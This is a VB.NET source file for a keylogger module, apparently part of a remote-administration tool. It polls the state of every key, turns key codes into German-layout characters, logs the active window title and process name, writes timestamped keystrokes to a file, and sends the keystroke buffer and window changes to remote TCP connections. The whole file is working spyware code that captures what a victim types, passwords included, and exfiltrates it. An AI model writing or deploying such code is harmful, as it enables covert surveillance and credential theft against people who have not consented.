'13.06.2020
Imports System.IO

Namespace KeyloggerModule
    Module Keylogger
        Public keyloggerStream As StreamWriter
        Public keyloggerOutputPath As String

        Public lastWindowHandle As IntPtr = New IntPtr()
        Public lastWindowTitle As String


        Private keylogBufferVar As String
        Public Property keylogBuffer() As String
            Set(value As String)
                If GadgetsForm.state = GadgetsForm.GadgetState.KEYLOGGER Then
                    GadgetsForm.textKeyloggerBuffer.Text = value
                End If
                keylogBufferVar = value
            End Set
            Get
                Return keylogBufferVar
            End Get
        End Property

        Public modKeys As ModKeyState
        Public Structure ModKeyState
            Dim ctrl As Boolean
            Dim shift As Boolean
            Dim alt As Boolean
            Dim altGr As Boolean
        End Structure

        Public ReadOnly Property allowHotkeys() As Boolean
            Get
                Return SettingsService.getSetting(SettingsIdentifier.KEYLOGGER_ALLOW_HOTKEYS)
            End Get
        End Property
        Public ReadOnly Property recordWindow() As Boolean
            Get
                Return SettingsService.getSetting(SettingsIdentifier.KEYLOGGER_RECORD_WINDOW)
            End Get
        End Property

        Function keyloggerInit(Optional reloadPath As Boolean = True) As Boolean
            If reloadPath Then
                updateKeyLoggerOutputPath(SettingsService.loadSetting(SettingsIdentifier.KEYLOGGER_PATH))
            End If

            If Not String.IsNullOrEmpty(keyloggerOutputPath) Then
                Dim purePath As String = keyloggerOutputPath.Substring(0, keyloggerOutputPath.LastIndexOf("\") + 1)
                If Not IO.Directory.Exists(purePath) Then
                    Try
                        IO.Directory.CreateDirectory(purePath)
                    Catch ex As Exception
                        Return False
                    End Try
                End If

                If Not IO.File.Exists(keyloggerOutputPath) Then
                    Try
                        IO.File.Create(keyloggerOutputPath).Close()
                    Catch ex As Exception
                        Return False
                    End Try
                End If
                Form1.keyloggerTimer.Start()
                keylogBuffer = ""
                logRaw("STARTUP timestamp [" & Now.ToShortDateString() & " " & Now.ToLongTimeString() & "]")
            Else
                Return False
            End If
            Return True
        End Function

        Sub updateKeyLoggerOutputPath(ByVal path As String, Optional appendFileName As Boolean = True)
            keyloggerOutputPath = path & IIf(path.EndsWith("\"), "", "\")
            If appendFileName Then
                Dim bootTime As Date = DateTime.Now.AddMilliseconds(-Environment.TickCount)
                keyloggerOutputPath &= "log_" & Format(bootTime, "yyyy_MM_dd_hh_mm_ss")
            End If
        End Sub

        Sub keyloggerDestroy()
            Form1.keyloggerTimer.Stop()
            flushKeylogBuffer()
            logRaw("SHUTDOWN timestamp [" & Now.ToShortDateString() & " " & Now.ToLongTimeString() & "]")
            If keyloggerStream IsNot Nothing Then
                keyloggerStream.Close()
            End If
        End Sub

        Sub handleTimerTick()
            For i = 0 To 255
                Dim state = ClickGadget.GetAsyncKeyState(i)
                modKeys.ctrl = Key.ctrlKey()
                modKeys.shift = Key.shiftKey()
                modKeys.alt = Key.altKey()
                modKeys.altGr = Key.altGrKey()

                If state = -32767 Then
                    logKeyStroke(i)
                ElseIf i <= 2 And state = -32768 Then
                    logKeyStroke(i)
                End If
            Next
        End Sub

        Sub logWindowChange()
            If recordWindow Then
                If isWindowSwitched() Or hasWindowTitleChanged() Then
                    Dim handle = getWindowHandle()
                    If handle <> 0 Then
                        lastWindowTitle = getWindowTitle()
                        lastWindowHandle = handle
                        flushKeylogBuffer()
                        Dim nameAndTitle As String = "[" & getWindowProcessName() & "] - " & "'" & getWindowTitle() & "'"
                        Dim output = getTimestamp() & "PROCESS: " & nameAndTitle
                        logRaw(output)
                        sendChange(nameAndTitle)
                    End If
                End If
            End If
        End Sub

        Sub sendChange(ByVal value As String)
            Dim connections = Form1.remoteTcp.getRandomConnectionOrder()
            connections.ForEach(
                Sub(c)
                    c.send("anscurrwindow" & value)
                End Sub)
        End Sub
        Sub logKeyStroke(i As Integer)
            logWindowChange()
            If isValidKey(i) Then
                Dim charFormat = getCharFormat(i)
                If isControlKeyStroke(i) Then
                    flushKeylogBuffer()
                    keylogBuffer = charFormat
                    flushKeylogBuffer()
                Else
                    charFormat = getSymbolFormat(i)
                    keylogBuffer &= charFormat
                End If
                logWindowChange()
            End If
        End Sub

        Sub flushKeylogBuffer()
            If Not String.IsNullOrEmpty(keylogBuffer) And Not String.IsNullOrWhiteSpace(keylogBuffer) Then
                If Not logRaw(getTimestamp() & keylogBuffer) Then
                    Return
                End If
                sendKeyBuffer(keylogBuffer)
            End If
            keylogBuffer = ""
        End Sub
        Sub sendKeyBuffer(value As String)
            Dim connections = Form1.remoteTcp.getRandomConnectionOrder()
            connections.ForEach(
                Sub(c)
                    c.send("anskeybuffer" & value)
                End Sub)
        End Sub

        Function getTimestamp() As String
            Return "[" & Now.ToLongTimeString() & "]: "
        End Function

        Function logRaw(text As String) As Boolean
            If IO.File.Exists(keyloggerOutputPath) Then
                Try
                    Using keyloggerStream = My.Computer.FileSystem.OpenTextFileWriter(keyloggerOutputPath, True)
                        keyloggerStream.WriteLineAsync(text)
                    End Using
                Catch ex As Exception
                    Return False
                End Try
            End If
            Return True
        End Function

        Function isValidKey(i As Integer) As Boolean
            Dim banned() = {1, 2, 4, 5, 6, 12, 16, 17, 18, 20, 144, 145, 160, 161, 162, 163, 164, 165, 174, 175, 179}
            Return Not banned.Contains(i)
        End Function

        Sub handleBackspace()
            If String.IsNullOrEmpty(keylogBuffer) Then Return
            If keylogBuffer.Length = 1 Then
                keylogBuffer = ""
            Else
                If modKeys.ctrl Then
                    Dim lastCharSpace As Integer = 0
                    If keylogBuffer.EndsWith(" ") Then lastCharSpace = 1
                    Dim isLastBlockLetter As Boolean = Char.IsLetterOrDigit(keylogBuffer.Substring(keylogBuffer.Length - 1 - lastCharSpace, 1))
                    Dim startIndex As Integer = 0
                    For i = keylogBuffer.Length - 1 - lastCharSpace To 0 Step -1
                        If isLastBlockLetter Then
                            If Not Char.IsLetterOrDigit(keylogBuffer(i)) Then
                                startIndex = i + 1
                                Exit For
                            End If
                        Else
                            If Char.IsLetterOrDigit(keylogBuffer(i)) Then
                                startIndex = i + 1
                                Exit For
                            End If
                        End If
                    Next
                    keylogBuffer = keylogBuffer.Substring(0, startIndex)
                Else
                    keylogBuffer = keylogBuffer.Substring(0, keylogBuffer.Length - 1)
                End If
            End If
        End Sub

        Function isControlKeyStroke(i) As Boolean
            Dim control() = {9, 13, 19, 27, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46, 91, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 193}
            Return control.Contains(i) Or modKeys.ctrl Or modKeys.alt
        End Function
        Function getCharFormat(i As Integer) As String
            Dim anyMod = modKeys.ctrl Or modKeys.alt Or modKeys.shift
            Dim caps As Boolean = My.Computer.Keyboard.CapsLock
            Select Case i
                Case 8
                    handleBackspace()
                    Return ""
                Case 9 : Return getModPrefix() & "TAB"
                Case 13 : Return getModPrefix() & "ENTER"
                Case 19 : Return getModPrefix() & "BREAK"
                Case 27 : Return getModPrefix() & "ESC"
                Case 33 : Return getModPrefix() & "PGUP"
                Case 34 : Return getModPrefix() & "PGDN"
                Case 35 : Return getModPrefix() & "END"
                Case 36 : Return getModPrefix() & "POS1"
                Case 37 : Return getModPrefix() & "LEFT"
                Case 38 : Return getModPrefix() & "UP"
                Case 39 : Return getModPrefix() & "RIGHT"
                Case 40 : Return getModPrefix() & "DOWN"
                Case 45 : Return getModPrefix() & "PRINT"
                Case 45 : Return getModPrefix() & "INSERT"
                Case 46 : Return getModPrefix() & "DEL"
                Case 91 : Return getModPrefix() & "WIN"
                Case 112 To 123 : Return getModPrefix() & "F" & (i - 111)
                Case 193 : Return getModPrefix() & "MENU"
                Case Else
                    Return getSymbolFormat(i)
            End Select
        End Function

        Function getSymbolFormat(i As Integer) As String
            Dim caps As Boolean = My.Computer.Keyboard.CapsLock
            Dim numLock As Boolean = My.Computer.Keyboard.NumLock

            Dim intermediate As String = Nothing
            If modKeys.shift Or caps Then
                intermediate = getSecondaryFormat(i)
            ElseIf modKeys.altGr Then
                intermediate = getTertiaryFormat(i)
            End If
            If intermediate IsNot Nothing Then
                Return intermediate
            End If

            Select Case i
                Case 8 : Return ""
                Case 32 : Return " "
                Case 48 To 57 : Return CStr(i - 48)
                Case 65 To 90 : Return getLetterFormat(Form1.dll.IntToAlph(i - 64))
                Case 96 To 105 : Return CStr(i - 96)
                Case 106 : Return "*"
                Case 107 : Return "+"
                Case 109 : Return "-"
                Case 110 : Return ","
                Case 111 : Return "/"
                Case 186 : Return "ü"
                Case 187 : Return "+"
                Case 188 : Return ","
                Case 189 : Return "-"
                Case 190 : Return "."
                Case 191 : Return "#"
                Case 192 : Return "ö"
                Case 219 : Return "ß"
                Case 220 : Return "^"
                Case 221 : Return "´"
                Case 222 : Return "ä"
                Case 226 : Return "<"
            End Select
            Return "[" & i & "]"
        End Function

        Function getSecondaryFormat(i As Integer) As String
            Select Case i
                Case 48 : Return "="
                Case 49 : Return "!"
                Case 50 : Return """"
                Case 51 : Return "§"
                Case 52 : Return "$"
                Case 53 : Return "%"
                Case 54 : Return "&"
                Case 55 : Return "/"
                Case 56 : Return "("
                Case 57 : Return ")"
                Case 65 To 90 : Return Form1.dll.IntToAlph(i - 64, True)
                Case 186 : Return "Ü"
                Case 187 : Return "*"
                Case 188 : Return ";"
                Case 189 : Return "_"
                Case 190 : Return ":"
                Case 191 : Return "'"
                Case 192 : Return "Ö"
                Case 219 : Return "?"
                Case 220 : Return "°"
                Case 221 : Return "`"
                Case 222 : Return "Ä"
                Case 226 : Return ">"
            End Select
            Return Nothing
        End Function

        Function getTertiaryFormat(i As Integer) As String
            Select Case i
                Case 48 : Return "}"
                Case 50 : Return "²"
                Case 51 : Return "³"
                Case 52 : Return "$"
                Case 53 : Return "%"
                Case 54 : Return "&"
                Case 55 : Return "{"
                Case 56 : Return "["
                Case 57 : Return "]"
                Case 186 : Return "Ü"
                Case 187 : Return "~"
                Case 219 : Return "\"
                Case 226 : Return "|"
            End Select
            Return Nothing
        End Function
        Function getLetterFormat(letter As String) As String
            Dim caps As Boolean = My.Computer.Keyboard.CapsLock
            If modKeys.shift Or caps Then Return letter.ToUpper()
            If modKeys.altGr Then
                If letter = "q" Then Return "@"
                If letter = "e" Then Return "€"
                If letter = "m" Then Return "µ"
            End If
            Dim prefix = getModPrefix()
            Return prefix & IIf(String.IsNullOrEmpty(prefix), letter.ToLower(), letter.ToUpper())
        End Function
        Function getModPrefix() As String
            Dim res = ""
            If modKeys.ctrl Then
                res = "CTRL+"
            End If
            If modKeys.shift Then
                res &= "SHIFT+"
            End If
            If modKeys.alt Then
                res &= "ALT+"
            End If
            If modKeys.altGr Then
                res &= "ALTGR+"
            End If
            Return res
        End Function
        Function hasWindowTitleChanged() As Boolean
            Dim currTitle As String = getWindowTitle()
            If currTitle <> lastWindowTitle Then
                Return True
            End If
            Return False
        End Function
        Function isWindowSwitched() As Boolean
            Dim currHandle = getWindowHandle()
            If currHandle <> lastWindowHandle Then
                Return True
            End If
            Return False
        End Function

        Function getWindowHandle() As IntPtr
            Return Utils.getForegroundWindow()
        End Function
        Function getWindowTitle() As String
            Dim ptr As IntPtr = Utils.getForegroundWindow()
            If ptr = 0 Then Return "Window handle zero"
            Dim len = Utils.GetWindowTextLength(ptr) + 1
            Dim title As String = Space(len)
            Utils.GetWindowText(ptr, title, len)
            title = title.Replace(vbNullChar, "")
            Return title
        End Function

        Function getWindowProcessName() As String
            Dim ptr As IntPtr = Utils.getForegroundWindow()
            If ptr = 0 Then Return "Window handle zero"
            Dim threadId As Integer
            Utils.GetWindowThreadProcessId(ptr, threadId)
            Dim process As Process
            Try
                process = Process.GetProcessById(threadId)
            Catch ex As Exception
                Return "No process for ptr " & ptr.ToString()
            End Try
            Return process.ProcessName
        End Function

        Function getParent(ptr As IntPtr) As IntPtr
            Dim parent As IntPtr = Utils.GetParent(ptr)
            If parent = 0 Then
                Return ptr
            Else
                Return getParent(parent)
            End If
        End Function

    End Module

End Namespace
